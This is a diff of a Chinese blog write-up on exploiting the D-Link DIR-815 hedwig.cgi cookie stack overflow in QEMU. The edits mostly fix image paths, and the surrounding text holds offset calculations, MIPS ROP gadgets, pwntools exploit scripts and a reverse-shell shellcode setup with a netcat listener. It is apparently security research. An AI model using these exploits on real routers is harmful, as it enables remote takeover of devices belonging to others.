@@ -12,22 +12,22 @@
 <h1 id="固件获取及漏洞定位"><a href="#固件获取及漏洞定位" class="headerlink" title="固件获取及漏洞定位"></a>固件获取及漏洞定位</h1><p>调试环境：ubuntu16.04 x64和x32，IDA6.8和7.0，qemu2.5</p>
 <p>固件下载地址：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP">ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP</a></p>
 <h2 id="固件解压"><a href="#固件解压" class="headerlink" title="固件解压"></a>固件解压</h2><p><code>binwalk -Me</code>解压 </p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cbinwalk.png" alt="">  </p>
+<p><img src="binwalk.png" alt="">  </p>
 <h2 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h2><p>该漏洞的核心组件为hedwig.cgi，<code>find . -name '*cgi'</code>查找文件，并<code>ls -l ./htdocs/web/hedwig.cgi</code>发现hedwig.cgi是指向./htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。   </p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cfind-name.png" alt=""></p>
+<p><img src="find-name.png" alt=""></p>
 <p>由之前的漏洞介绍可以知道<code>HTTP_COOKIE</code>过长导致漏洞，分别用IDA和ghidra打开cgibin这个文件，在string窗口中进行搜索<code>HTTP_COOKIE</code></p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Chttp_cookie.png" alt="">可以找到有一个函数，就是<code>sess_get_uid</code>，我之前有写<a href="https://pup2y.github.io/2020/05/19/d-linkzhong-sobj-lei-han-shu-ni-xiang-fen-xi/">帖子</a>分析一下这个函数，就是提取<code>HTTP_COOKIE</code>里面的<code>uid=</code>之后的部分。交叉引用一下，找到了<code>hedwigcgi_main</code>函数。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Csess_get_uid()ref.png" alt="">)利用Ghidra反汇编<code>hedwigcgi_main</code>函数，可以定位到其中的<code>sprintf</code>函数引起了栈溢出。<code>hedwigcgi_main</code>函数通过<code>sess_get_uid()</code>获取到<code>HTTP_COOKIE</code>中<code>uid=</code>之后的值，并将该内容按照<code>sprintf</code>函数中格式化字符串给定的形式拷贝到栈中，由于没有检测并限制输入的大小，导致栈溢出。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Csprintf()1.png" alt=""></p>
+<p><img src="http_cookie.png" alt="">可以找到有一个函数，就是<code>sess_get_uid</code>，我之前有写<a href="https://pup2y.github.io/2020/05/19/d-linkzhong-sobj-lei-han-shu-ni-xiang-fen-xi/">帖子</a>分析一下这个函数，就是提取<code>HTTP_COOKIE</code>里面的<code>uid=</code>之后的部分。交叉引用一下，找到了<code>hedwigcgi_main</code>函数。</p>
+<p><img src="sess_get_uid()ref.png" alt="">)利用Ghidra反汇编<code>hedwigcgi_main</code>函数，可以定位到其中的<code>sprintf</code>函数引起了栈溢出。<code>hedwigcgi_main</code>函数通过<code>sess_get_uid()</code>获取到<code>HTTP_COOKIE</code>中<code>uid=</code>之后的值，并将该内容按照<code>sprintf</code>函数中格式化字符串给定的形式拷贝到栈中，由于没有检测并限制输入的大小，导致栈溢出。</p>
+<p><img src="sprintf()1.png" alt=""></p>
 <p>但是继续往后看该函数中后面还有一个<code>sprintf</code>函数，第四个参数同样是<code>HTTP_COOKIE</code>中<code>uid=</code>后面的内容，这一块按道理来说也可以导致栈溢出。而且如果可以执行该<code>sprintf</code>函数则能覆盖之前<code>sprintf</code>函数栈上的内容。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Csprintf()2.png" alt=""></p>
+<p><img src="sprintf()2.png" alt=""></p>
 <p>在《揭秘家用路由器0day漏洞挖掘技术》一书中写到，如果在文件系统中手工创建<code>/var/tmp</code>文件夹，就能够到达第二个<code>sprintf</code>函数。我对比了下有无<code>/var/tmp</code>文件夹的返回结果:</p>
 <p>无<code>/var/tmp</code>，返回unable to open temp file。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cvar-tmp.png" alt=""></p>
+<p><img src="var-tmp.png" alt=""></p>
 <p>有<code>/var/tmp</code>，返回no xml data。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cvar-tmp2.png" alt=""></p>
+<p><img src="var-tmp2.png" alt=""></p>
 <p>想着往里面写个/temp.xml文件并添加内容就可以了吧，结果发现还是返回no xml data。因为fopen打开该文件的方式是’w’，创建一个用于写入的空文件。如果文件名称与已存在的文件相同，则会删除已有文件的内容，文件被视为一个新的空文件。所以只要执行了这条指令文件内容就会被清空，返回值一定是<code>no xml data</code>，所以利用qemu用户模式这样调试的话，是到不了第二个<code>sprintf</code>函数。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cfopen.png" alt=""></p>
+<p><img src="fopen.png" alt=""></p>
 <p>所以漏洞点是第一个<code>sprintf</code>函数。其实有挺多帖子也是分析得到第一个<code>sprintf</code>函数是漏洞点，死活到不了第二个sprintf。</p>
 <h2 id="漏洞重新定位"><a href="#漏洞重新定位" class="headerlink" title="漏洞重新定位"></a>漏洞重新定位</h2><p>爆肝一晚，参考一个大佬的<a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN" target="_blank" rel="noopener">文章</a>，发现了为什么到达不了第二个sprintf的原因。</p>
 <p>还需要POST数据包中包含”uid=……”，否则运行不了下面的代码，</p>
@@ -74,11 +74,11 @@ rm -f ./qemu</code></pre>
 <p>在这之前需要利用patternLocOffset.py生成test文件，包含特定格式的2000个字符串。</p>
 <p><code>python patternLocOffset.py -c -l 2000 -f test</code></p>
 <p>使用IDA调试发现运行到hedwigcgi_main()返回时ra寄存器中的值为0x38694237</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cra.png" alt=""></p>
+<p><img src="ra.png" alt=""></p>
 <p><code>python patternLocOffset.py -s 0x38694237 -l 2000</code>确定缓冲区距离ra的距离为1043。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5C%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB.png" alt=""></p>
+<p><img src="%E7%A1%AE%E5%AE%9A%E5%81%8F%E7%A7%BB.png" alt=""></p>
 <p>可以通过修改test.sh中的<code>test =$(python -c "print 'uid=' + 'A'*1043 + 'B'*4")</code>进一步确定偏移为1043。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5C1043offset.png" alt=""></p>
+<p><img src="1043offset.png" alt=""></p>
 <p>以上是触发第一个sprintf()的偏移。</p>
 <h2 id="重新确定偏移"><a href="#重新确定偏移" class="headerlink" title="重新确定偏移"></a>重新确定偏移</h2><p>更改test.sh，在脚本中加入echo “uid=xxx”。</p>
 <pre class=" language-sh"><code class="language-sh">#!/bin/bash
@@ -95,10 +95,10 @@ rm -f ./qemu</code></pre>
 <p>执行命令</p>
 <pre class=" language-sh"><code class="language-sh">sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`</code></pre>
 <p>调试之后发现确实能够触发第二个sprintf()。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Csprintf()3.png" alt=""></p>
+<p><img src="sprintf()3.png" alt=""></p>
 <p>并且覆盖了ra=68423668。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cra2.png" alt=""></p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5C%E5%81%8F%E7%A7%BB2.png" alt=""></p>
+<p><img src="ra2.png" alt=""></p>
+<p><img src="%E5%81%8F%E7%A7%BB2.png" alt=""></p>
 <p>计算得到偏移为1009。</p>
 <h2 id="构造ROP链"><a href="#构造ROP链" class="headerlink" title="构造ROP链"></a>构造ROP链</h2><h3 id="通过system函数getshell"><a href="#通过system函数getshell" class="headerlink" title="通过system函数getshell"></a>通过system函数getshell</h3><p>主要目的是调用system(‘/bin/sh’)来getshell，system函数在libc.so中找，参数’/bin/sh’首先放入栈中，然后利用gadget将栈上的’/bin/sh’传入a0寄存器，再调用system函数即可。</p>
 <h4 id="定位system函数地址"><a href="#定位system函数地址" class="headerlink" title="定位system函数地址"></a>定位system函数地址</h4><p>参考《0day》那本书，首先需要搜索system函数的地址，需要先找到libc.so，然后在libc.so中找到system函数。</p>
@@ -117,23 +117,23 @@ target remote :23957
 b *0x409a54</code></pre>
 <p>gdb-multiarch调试的时候执行<code>gdb-multiarch -x dbgscript</code>，-x是指定要执行的命令文件。</p>
 <p>得到libuClibc-0.9.30.1.so的基地址为0x76738000。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Clibc-so.png" alt=""></p>
+<p><img src="libc-so.png" alt=""></p>
 <p>找到libuClibc-0.9.30.1.so用IDA打开，system函数在0x53200处。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Csystem.png" alt=""></p>
+<p><img src="system.png" alt=""></p>
 <p>这样就得到了system函数的真实地址0x76738000+0x53200=0x7678b200。</p>
 <h4 id="绕过0构造rop链"><a href="#绕过0构造rop链" class="headerlink" title="绕过0构造rop链"></a>绕过0构造rop链</h4><p>因为system函数的最低位为\x00，在构造HTTP_COOKIE的时候\x00会被sprintf截断，其实还不用到sprintf函数，之前sess_get_uid函数就获取\x00字符之前的字符串，导致缓冲区溢出失败。所以构造shellcode时需要存入的事0x7678b200-1=0x7678b1ff，之后通过寻址gadget将其加1即可。</p>
 <p>首先考虑将栈上地址放入寄存器中，在libuClibc-0.9.30.1.so利用mipsrop插件中的<code>mipsrop.stackfinder()</code>命令查找将堆栈中数据放入寄存器的gadget。在0x159cc处发现可将当前栈$sp+0x10处的值存入寄存器s5并跳转至s0。并且在跳转之前将$s5的内容给到$a0，这样system函数的第一个参数就成功了。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cgadget.png" alt=""></p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cjalrs0.png" alt=""></p>
+<p><img src="gadget.png" alt=""></p>
+<p><img src="jalrs0.png" alt=""></p>
 <p>继续在libuClibc-0.9.30.1.so中寻找+1的gadget，使用mipsrop插件，<code>mipsrop.find("addiu .*,1")</code>得到31个gadget，找到0x00045988处，将寄存器s0中的值加一。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Caddiu1.png" alt=""></p>
+<p><img src="addiu1.png" alt=""></p>
 <p>所以需要将system函数地址减一之后放入s0寄存器中，这个gadget之后是跳转到s1寄存器中的地址。</p>
 <p>由IDA中的反汇编代码可以看出我们可以控制数据覆盖ra,fp,s7~s0寄存器。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5C%E8%A6%86%E7%9B%96.png" alt=""></p>
+<p><img src="%E8%A6%86%E7%9B%96.png" alt=""></p>
 <p>可以这样构造数据，payload大致如下：</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5C%E6%9E%84%E9%80%A0.png" alt=""></p>
+<p><img src="%E6%9E%84%E9%80%A0.png" alt=""></p>
 <p>这里参考下H4lo师傅的整个流程图：</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5CH4lo.png" alt=""></p>
+<p><img src="H4lo.png" alt=""></p>
 <p>对应的exp如下：</p>
 <pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span>
 <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -165,38 +165,38 @@ f<span class="token punctuation">.</span>close<span class="token punctuation">(<
 <h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p>执行命令：</p>
 <pre class=" language-sh"><code class="language-sh">sudo ./test.sh  'uid=1234' `python -c "print 'uid=' + open('exploit','r').read()"`</code></pre>
 <p>使用gdb-multiarch联调发现，确实能够跳转到gadget1处（0x76738000+0x45988=0x7677d988），将s0处的system-1地址加一。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cgadget1.png" alt=""></p>
+<p><img src="gadget1.png" alt=""></p>
 <p>之后顺利进入gadget1处(0x76738000+0x159cc=0x7674d9cc)处，将栈上内容(sp+0x10)先加载到s5，并在跳转s0前将s5中内容传给a0。</p>
-<p><img src="C:%5CUsers%5CMSI-PC%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523123038928.png" alt="image-20200523123038928"></p>
+<p><img src="addius5sp10.png" alt=""></p>
 <p>进入system处，a0参数为/bin//sh。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Clibc_system.png" alt=""></p>
+<p><img src="libc_system.png" alt=""></p>
 <p>继续往下执行，发现执行完system函数返回时被中断了，因为当前指令是从(fp+0x10)处取一个字节给$gp，然后当前$fp的内容为0x0，(fp+0x10处)也无法访问，所以自然就报错了。空指针问题</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Clibc_system2.png" alt=""></p>
+<p><img src="libc_system2.png" alt=""></p>
 <p>但是在整个rop链运行过程中并没有出现给$fp赋值的操作，所以这块为什么$fp会变成0，变成空指针。这是一个问题，需要解决，应该是还是构造的rop链执行system函数的过程中出现了问题。</p>
 <h3 id="调用sleep-1-函数"><a href="#调用sleep-1-函数" class="headerlink" title="调用sleep(1)函数"></a>调用sleep(1)函数</h3><p>接下来考虑利用另一种方式通过调用sleep(1)函数来getshell，至于为什么利用sleep(1)函数呢，参考这篇<a href="[http://xdxd.love/2016/12/09/%E4%B8%80%E4%B8%AAmips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8/](http://xdxd.love/2016/12/09/一个mips栈溢出利用/)">文章</a>，里面有讲到一个问题就是cache incoherency。MIPS CPUs有两个独立的cache：<strong>指令cache</strong>和<strong>数据cache</strong>。指令和数据分别在两个不同的缓存中。当缓存满了，会触发flush，将数据写回到主内存。<strong>攻击者的攻击payload通常会被应用当做数据来处理，存储在数据缓存中</strong>。当payload触发漏洞，劫持程序执行流程的时候，会去执行内存中的shellcode。*<em>如果数据缓存没有触发flush的话，shellcode依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储shellcode的地址处随机的代码，导致不可预知的后果。 *</em></p>
 <p>最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如sleep(1)或者其他类似的函数。sleep的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行flush。 </p>
 <p>整个ROP的调用流程参考<a href="https://www.anquanke.com/post/id/179510#h3-6" target="_blank" rel="noopener">H4lo</a>师傅的图。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5C%E8%B0%83%E7%94%A8sleep.png" alt=""></p>
+<p><img src="%E8%B0%83%E7%94%A8sleep.png" alt=""></p>
 <h4 id="ROP-Gadget使用"><a href="#ROP-Gadget使用" class="headerlink" title="ROP Gadget使用"></a>ROP Gadget使用</h4><h5 id="ROP-Gadget-1"><a href="#ROP-Gadget-1" class="headerlink" title="ROP Gadget 1"></a>ROP Gadget 1</h5><p>利用<code>mipsrop.find("li $a0,1")</code>寻找到0x57E50处，并且返回时跳转至s1寄存器中地址。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Clia0.png" alt="image-20200523125559112"></p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5C0x57E50.png" alt=""></p>
+<p><img src="lia0.png" alt=""></p>
+<p><img src="0x57E50.png" alt=""></p>
 <p>可以将ra处覆盖为<code>ra=gadget1=0x57E50+libc_base</code>。之后寻找第二个gadget2将其放入s1，这里不能直接将sleep函数放入s1中，因为sleep函数运行完jr $ra时，我们控制不了，所以接下来应该是寻找能够控制$ra的gadget2.</p>
 <h5 id="ROP-Gadget-2"><a href="#ROP-Gadget-2" class="headerlink" title="ROP Gadget 2"></a>ROP Gadget 2</h5><p>利用mipsrop插件中的<code>mipsrop.tail()</code>该函数作用是<code>Prints a lits of all tail call gadgets (useful for function calls).</code>打印出所有函数尾部调用的gadget，这些gadget对函数调用很有效。因为非叶子函数尾部一般是将栈中值返回给寄存器然后再跳转。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cmipsrop-tail.png" alt=""></p>
+<p><img src="mipsrop-tail.png" alt=""></p>
 <p>选择0x3B8A8作为gadget2。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5C3B8A8.png" alt=""></p>
+<p><img src="3B8A8.png" alt=""></p>
 <p>该gadget的作用是将栈上(sp+0x24)处的内容给到寄存器ra，然后再跳转至s2寄存器中，所以s2寄存器就可以放我们需要的sleep函数的地址。这样的话<code>s1=gadget2=0x3B8A8+libc_base</code>，<code>s2 = sleep+libc_base</code>。</p>
 <p>sleep函数在libuClibc-0.9.30.1.so的偏移为0x56BD0。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Clibc_sleep.png" alt=""></p>
+<p><img src="libc_sleep.png" alt=""></p>
 <h5 id="ROP-Gadget-3"><a href="#ROP-Gadget-3" class="headerlink" title="ROP Gadget 3"></a>ROP Gadget 3</h5><p>执行完sleep函数之后需要控制程序执行栈上shellcode，这里需要用到mipsrop插件的<code>mipsrop.stackfinder()</code>，将栈上的shellcode地址存储进寄存器中。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cmipsrop-stackfinders.png" alt=""></p>
+<p><img src="mipsrop-stackfinders.png" alt=""></p>
 <p>找到0x14F28处的gadget3，所以<code>$(sp+0x24)=gadget3</code>作用是将sp+0x18处的值赋给s1，之后跳转到s4寄存器中的地址。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5C14F28.png" alt=""></p>
+<p><img src="14F28.png" alt=""></p>
 <p>所以接下来我们需要的gadget4是’move $t9,$s1’，跳转到是s1也就是我们的shellcode。</p>
 <h5 id="ROP-Gadget-4"><a href="#ROP-Gadget-4" class="headerlink" title="ROP Gadget 4"></a>ROP Gadget 4</h5><p>利用<code>mipsrop.find("move $t9,$s1")</code>找到一下gadget。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cmovet9s1.png" alt=""></p>
+<p><img src="movet9s1.png" alt=""></p>
 <p>这里选择0x1DD08作为gadget4，<code>s4=gadget4=0x1DD08+libc_base</code>。因为其他的gadget可能导致最后出现坏字符，比如我试了0xBB44，结果真实地址为0xBB44+0x76738000=0x76743b44，然而3b在sess_get_uid的时候就被截断了,所以导致rop没有构造成功。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5C0x1DD08.png" alt=""></p>
+<p><img src="0x1DD08.png" alt=""></p>
 <p>到这里所有的gadget都找齐了，接下来开始构造exp。</p>
 <h5 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h5><p>整个payload是这样的：</p>
 <p>这里顺便提下构造exp时有可能的坏字符：0x20（空格）、0x00（结束符）、0x3a（冒号）、0x3f（问号）、0x3b（分号）、0x0a(\n换行符)等。具体还要看程序如何处理以及转义。</p>
@@ -238,9 +238,9 @@ payload <span class="token operator">+=</span> p32<span class="token punctuation
 payload <span class="token operator">+=</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token comment" spellcheck="true"># mipsrop.stackfinder() 0x18B padding</span>
 payload <span class="token operator">+=</span> shellcode</code></pre>
 <p>调试结果显示能够进入到Shellcode去执行。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cshellcode.png" alt=""></p>
+<p><img src="shellcode.png" alt=""></p>
 <p>但是之后一直出不去，获取不到shell。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cshellcode2.png" alt=""></p>
+<p><img src="shellcode2.png" alt=""></p>
 <p>所以到目前为止，利用qemu用户模式还没有成功获取shell！！！</p>
 <h2 id="利用qemu-system-mipsel调试"><a href="#利用qemu-system-mipsel调试" class="headerlink" title="利用qemu-system-mipsel调试"></a>利用qemu-system-mipsel调试</h2><p>我们这里主要是为了在qemu虚拟机中重现http服务。通过查看文件系统中的<code>/bin、/sbin、/usr/bin、/usr/sbin</code>可以知道<code>/sbin/httpd</code>应该是用于监听web端口的http服务，同时查看<code>/htdocs/web</code>文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。</p>
 <h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p><code>find ./ -name '*http*'</code>找到web配置文件httpcfg.php。</p>
@@ -538,7 +538,7 @@ ln -s /htdocs/cgibin /usr/sbin/phpcgi
 ln -s  /htdocs/cgibin /usr/sbin/hnap
 ./httpd -f conf</code></pre>
 <p>之后可以在浏览器访问conf文件中配置的192.168.79.143:1234/hedwig.cgi</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Chedwigchi%E6%96%87%E4%BB%B6.png" alt=""></p>
+<p><img src="hedwigchi%E6%96%87%E4%BB%B6.png" alt=""></p>
 <p>或者在宿主机中使用以下命令：其中-v显示详细信息，-X指定什么指令，-H 自定义头信息传递给服务器，-b 指定cookie字符串。</p>
 <pre class=" language-sh"><code class="language-sh">#curl http://192.168.79.143:1234/hedwig.cgi -v -X POST -H "Content-Length: 8" -b  "uid=zh"
 *   Trying 192.168.79.143...
@@ -606,7 +606,7 @@ set architecture mips
 target remote 192.168.79.143:6666 #对应qemu地址和端口
 c</code></pre>
 <p>得到溢出地址是0x68423668，利用脚本计算偏移为1009</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cgdbseveroffset.png" alt=""></p>
+<p><img src="gdbseveroffset.png" alt=""></p>
 <pre class=" language-sh"><code class="language-sh">#./patternLocOffset.py -s 0x68423668 -l 2000 
 [*] Create pattern string contains 2000 characters ok!
 [*] No exact matches, looking for likely candidates...
@@ -689,7 +689,7 @@ export REQUEST_URI="/hedwig.cgi"
 echo "uid=1234"|/htdocs/web/hedwig.cgi
 #echo "uid=1234"|./gdbserver.mipsel 192.168.79.145:6666 /htdocs/web/hedwig.cgi</code></pre>
 <p>在mips虚拟机运行之后在本机nc -vlp 9999，确实能够获取/bin/bash权限。成功了！说明rop链构造是没问题的。</p>
-<p><img src="F:%5Cmyblog%5Csource_posts%5CDIR815%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%86%8D%E5%88%86%E6%9E%90%5Cncvlp9999.png" alt=""></p>
+<p><img src="ncvlp9999.png" alt=""></p>
 </li>
 <li><p>利用sleep(1)调用shellcode</p>
 <p>这里的shllcode作用是给指定的IP地址和端口反弹shell，根据<a href="http://shell-storm.org/shellcode/files/shellcode-860.php" target="_blank" rel="noopener">文章</a>修改其中的socket反向连接IP，端口没有改变还是31337。</p>
@@ -743,7 +743,7 @@ f = open("exploit2",'wb+')
 f.write(payload)
 f.close()</code></pre>
